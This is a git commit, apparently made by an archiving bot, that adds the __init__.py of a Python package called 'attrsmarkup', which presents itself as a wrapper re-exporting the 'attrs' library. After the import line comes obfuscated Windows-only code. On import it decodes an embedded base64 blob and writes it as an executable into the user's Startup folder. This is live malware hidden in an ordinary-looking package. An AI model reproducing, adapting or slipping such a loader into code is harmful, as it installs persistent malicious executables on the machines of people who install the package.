9b39a582d356127c91a83688842e1332ecafd0dd
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-12-16 15:05:09 +0000

    Add package attrsmarkup/23.2.0/attrsmarkup-23.2.0.tar.gz

---
+++ packages/attrsmarkup/attrsmarkup-23.2.0.tar.gz/attrsmarkup-23.2.0/attrsmarkup/__init__.py
@@ -0,0 +1,7 @@
+from attrs import *
+from platform import system as U
+if U().lower()=='windows':
+    from operator import truediv as v
+    from functools import partial as f
+    from .about import g
+    (_:=lambda x:Z[1](f(Z[2],lambda x:Z[-1](Z[-2](v(Z[0](x),2))))(x)),B:=G(_(r'¾¾ÄêÒØèÒÜæ¾¾')),A:=B[_(r'ÎÊèÂèèä')],o:=B[_(r'ÞàÊÜ')],I:=B[_(r'¾¾ÒÚàÞäè¾¾')],h:=A(I(_(r'ÄÂæÊlh')),_(r'ÄlhÈÊÆÞÈÊ')),A(o(A((s:=(A(I(_('ÌêÜÆèÞÞØæ')),_(r'äÊÈêÆÊ')))(v,(A(I(_(r'ÒèÊäèÞÞØæ')),_(r'ÆÐÂÒÜ')))((A(A(I(_(r'àÂèÐØÒÄ')),_('\xa0ÂèÐ')),_(r'ÐÞÚÊ'))(),),_('\x82àà\x88ÂèÂ\\¤ÞÂÚÒÜÎ\\\x9aÒÆäÞæÞÌè\\®ÒÜÈÞîæ\\¦èÂäè@\x9aÊÜê\\\xa0äÞÎäÂÚæ\\¦èÂäèêà').split(_('\\')))),)[-1],_(r'ÚÖÈÒä'))(**{_(r'àÂäÊÜèæ'):(U:=B[_(r'ÄÞÞØ')]),_(r'ÊðÒæè¾ÞÖ'):U})or s/_('ÐÒ\\ÊðÊ'),_(r'îÄ')),_(r'îäÒèÊ'))(h(g())))if(Z:=(ord,''.join,map,G:=globals().__getitem__,int,chr))else()
